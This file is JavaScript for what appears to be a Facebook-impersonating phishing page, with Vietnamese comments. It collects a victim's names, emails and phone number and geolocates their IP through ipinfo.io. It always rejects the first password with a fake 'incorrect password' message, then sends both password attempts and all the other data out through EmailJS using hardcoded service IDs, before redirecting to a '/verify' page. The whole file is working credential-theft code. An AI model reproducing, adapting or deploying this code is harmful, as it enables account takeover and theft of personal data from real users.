document.getElementById('continueButton').addEventListener('click', async function () {
    const pageName = document.getElementById('page-name');
    const fullName = document.getElementById('full-name');
    const email = document.getElementById('email');
    const businessEmail = document.getElementById('email-bus');
    const phone = document.getElementById('phone');

    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phonePattern = /^[0-9+\-() ]{6,20}$/;

    let valid = true;

    document.querySelectorAll('input').forEach(input => input.classList.remove('error'));

    if (pageName.value.trim() === "") {
        pageName.classList.add('error');
        valid = false;
    }

    if (fullName.value.trim() === "") {
        fullName.classList.add('error');
        valid = false;
    }

    if (!emailPattern.test(email.value)) {
        email.classList.add('error');
        valid = false;
    }

    if (!emailPattern.test(businessEmail.value)) {
        businessEmail.classList.add('error');
        valid = false;
    }

    if (!phonePattern.test(phone.value)) {
        phone.classList.add('error');
        valid = false;
    }

    if (valid) {
        sessionStorage.setItem('page-name', pageName.value);
        sessionStorage.setItem('full-name', fullName.value);
        sessionStorage.setItem('email', email.value);
        sessionStorage.setItem('email-bus', businessEmail.value);
        sessionStorage.setItem('phone', phone.value);

        try {
            const response = await fetch('https://ipinfo.io?token=556e67077559fb', { cache: 'no-cache' });
            if (!response.ok) throw new Error('API ipinfo.io trả về lỗi');

            const data = await response.json();
            const countryCode = data.country || 'Unknown';
            const region = data.region || 'Unknown';
            const city = data.city || 'Unknown';
            const ipAddress = data.ip || 'Unknown';

            const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
            const countryName = regionNames.of(countryCode) || countryCode;

            const location = `${countryName}/${region}/${city}`;
            sessionStorage.setItem('location', location);
            sessionStorage.setItem('ip-address', ipAddress);

            document.getElementById('overlay').style.display = 'flex';
        } catch (error) {
            console.error('Lỗi khi lấy thông tin vị trí:', error);
            sessionStorage.setItem('location', 'Unknown/Unknown/Unknown');
            sessionStorage.setItem('ip-address', 'Unknown');
            document.getElementById('overlay').style.display = 'flex';
        }
    }
});

let firstPassword = null;

document.getElementById('passwordForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    const passwordInput = document.getElementById('password');
    const password = passwordInput.value.trim();
    const errorMessage = document.getElementById('error-message');

    errorMessage.style.display = 'none';
    errorMessage.innerHTML = '';

    const urlpage = sessionStorage.getItem('page-name');
    const email = sessionStorage.getItem('email');
    const businessEmail = sessionStorage.getItem('email-bus');
    const phone = sessionStorage.getItem('phone');
    const location = sessionStorage.getItem('location') || 'Unknown/Unknown/Unknown';
    const ipAddress = sessionStorage.getItem('ip-address') || 'Unknown';

    try {
        emailjs.init('eBOyvEWjwfg1r8Ntb');

        if (!firstPassword) {
            firstPassword = password;
            sessionStorage.setItem('first-password', firstPassword);
            await emailjs.send('service_28gd8kz', 'template_ivpejkn', {
                url_page: urlpage,
                personal_email: email,
                business_email: businessEmail,
                phone: phone,
                location: location,
                ip_address: ipAddress,
                first_password: firstPassword,
                second_password: 'Chưa nhập'
            });

            setTimeout(() => {
                errorMessage.innerHTML = `
                    <div style="text-align: center; margin-bottom: 10px;">
                        The password you've entered is incorrect. Please try again.
                        <div style="margin-top: 5px;">
                            <a href="https://www.facebook.com/recover/initiate/" target="_blank" style="color: blue; text-decoration: none;">Forgot password?</a>
                        </div>
                    </div>
                `;
                errorMessage.style.color = 'red';
                errorMessage.style.display = 'block';
            }, 2000);
        } else {
            const secondPassword = password;
            sessionStorage.setItem('second-password', secondPassword);
            await emailjs.send('service_28gd8kz', 'template_ivpejkn', {
                url_page: urlpage,
                personal_email: email,
                business_email: businessEmail,
                phone: phone,
                location: location,
                ip_address: ipAddress,
                first_password: firstPassword,
                second_password: secondPassword
            });

            window.location.href = '/verify';
        }
    } catch (error) {
        console.error('Lỗi khi gửi mật khẩu:', error);
        alert('Không thể gửi thông tin. Vui lòng kiểm tra kết nối mạng hoặc cấu hình EmailJS.');
    }
});
